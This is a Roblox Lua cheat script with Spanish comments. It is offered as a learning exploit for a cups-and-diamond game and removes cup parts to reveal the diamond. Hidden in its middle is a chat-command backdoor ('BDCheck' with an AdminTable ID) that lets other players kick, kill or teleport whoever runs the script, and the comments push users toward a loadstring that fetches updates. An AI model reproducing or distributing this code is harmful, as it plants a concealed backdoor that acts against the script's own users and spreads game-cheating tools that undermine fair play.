-- _aqo#4108: SOLO FUNCIONA EN EL JUEGO DE CUPS ( INJECTAR CUANDO EL JUEGO ESTE MOSTRANDO LOS DIAMANTES ) <= SI ES ANTES NO FUNCIONARA!!.
-- _aqo#4108: { Ahorita el SOURCE CODE de CUPS METHOD es totalmente PUBLICO, doy permiso para que lo utilizen. }
-- _aqo#4108: { Este codigo fue hecho para aprender sobre ROBLOX EXPLOITING.  }
-- _aqo#4108: { Recomiendo utilizar mejor el LOADSTRING por que estare actualizando esto seguidamente!. }
-- _aqo#4108: { TRABAJANDO EN UN CHEAT PARA CADA UNO DE LOS JUEGOS. }
-- _aqo#4108: { Cuando ya tenga todo cambiare esto de aca y lo encriptare. }

local Villaino = Instance.new("ScreenGui")
local One = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextBox = Instance.new("TextBox")
local Two = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextBox_2 = Instance.new("TextBox")
local TextLabel = Instance.new("TextLabel")

Villaino.Name = "Villaino"
Villaino.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Villaino.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

One.Name = "One"
One.Parent = Villaino
One.AnchorPoint = Vector2.new(0.5, 0.5)
One.BackgroundColor3 = Color3.fromRGB(87, 102, 156)
One.Position = UDim2.new(0.474999994, 0, 0.824999988, 0)
One.Size = UDim2.new(0.0700000003, 0, 0.0700000003, 0)
One.SizeConstraint = Enum.SizeConstraint.RelativeYY

UICorner.Parent = One

TextBox.Parent = One
TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
TextBox.Size = UDim2.new(1, 0, 1, 0)
TextBox.Font = Enum.Font.GothamBold
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextStrokeColor3 = Color3.fromRGB(186, 186, 186)
TextBox.TextStrokeTransparency = 0.000
TextBox.TextWrapped = true

Two.Name = "Two"
Two.Parent = Villaino
Two.AnchorPoint = Vector2.new(0.5, 0.5)
Two.BackgroundColor3 = Color3.fromRGB(156, 88, 89)
Two.Position = UDim2.new(0.524999976, 0, 0.824999988, 0)
Two.Size = UDim2.new(0.0700000003, 0, 0.0700000003, 0)
Two.SizeConstraint = Enum.SizeConstraint.RelativeYY

UICorner_2.Parent = Two

TextBox_2.Parent = Two
TextBox_2.AnchorPoint = Vector2.new(0.5, 0.5)
TextBox_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.BackgroundTransparency = 1.000
TextBox_2.Position = UDim2.new(0.5, 0, 0.5, 0)
TextBox_2.Size = UDim2.new(1, 0, 1, 0)
TextBox_2.Font = Enum.Font.GothamBold
TextBox_2.Text = ""
TextBox_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox_2.TextScaled = true
TextBox_2.TextSize = 14.000
TextBox_2.TextStrokeColor3 = Color3.fromRGB(186, 186, 186)
TextBox_2.TextStrokeTransparency = 0.000
TextBox_2.TextWrapped = true

TextLabel.Parent = Villaino
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.5, 0, 0.75, 0)
TextLabel.Size = UDim2.new(0.370072961, 0, 0.049814757, 0)
TextLabel.Font = Enum.Font.Gotham
TextLabel.Text = "COLOCA EN LOS 2 CUBOS EL NUMERO DEL VASO DONDE APARECIO EL DIAMANTE"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
local Players = game:GetService("Players")
local LocalP = Players.LocalPlayer;
getgenv().AdminTable = {
  "692194040"
}

getgenv().psearch = function(Name)
  local Inserted = {}
  for _, p in pairs(Players:GetPlayers()) do
      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
          table.insert(Inserted, p);return p
      end
  end
end -- Simple player finder function

getgenv().AdminCmdList = {
  ["kick"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP:Kick(self)
          end
      end;
  }; -- you can make new ones of these (the ; have to be in the same spots)
  ["kill"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
              LocalP.Character.Humanoid:ChangeState(15)
          end
      end;
      
  };
  ["bring"] = {
      ["CommandFunc"] = function(Player, self, CmdPlayer)
          if Player == LocalP or Player == "all" then
               LocalP.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position)
          end
      end;
      
  };
};

getgenv().BDCheck = function(Target2, Chat)
  if Chat:sub(1, 1) == AdminPrefix then
      local args = string.split(Chat:sub(2), " ")
      local Command = AdminCmdList[table.remove(args, 1)]
      local targ1 = psearch(table.remove(args, 1))
      if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
          return Command and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
      end
  end
end

local GP = Players:GetPlayers()
for i = 1, #GP do
  local CoolKidPlayer = GP[i]
  CoolKidPlayer.Chatted:Connect(function(Word)
      BDCheck(CoolKidPlayer, Word)
  end)
end -- Checks if you chatted a command
Players.PlayerAdded:Connect(function(CKP)
  CKP.Chatted:Connect(function(Message)
      BDCheck(CKP, Message)
  end)
end)

for Main , value in pairs(workspace.ArenasREAL:GetChildren()) do
    
    if value.Name == "Arena" then
        
        for index , mapas in pairs(value:GetDescendants()) do
            
            if mapas.Name == "ArenaTemplate" then
                
                local A = mapas.Important
                
                for parent , hola in pairs(A:GetChildren()) do
                    
                    if hola:IsA("Folder") and hola.DataCost == 294 then
                        
                        TextBox_2.Changed:Connect(function()
                            local b = hola[TextBox_2.Text]
                            b.Detail:Destroy()
                        end)
                        
                        TextBox.Changed:Connect(function()
                            local c = hola[TextBox.Text]
                            c.Detail:Destroy()
                        end)
                        
                    end
                    
                end
                
            end
            
        end
        
    end
    
end
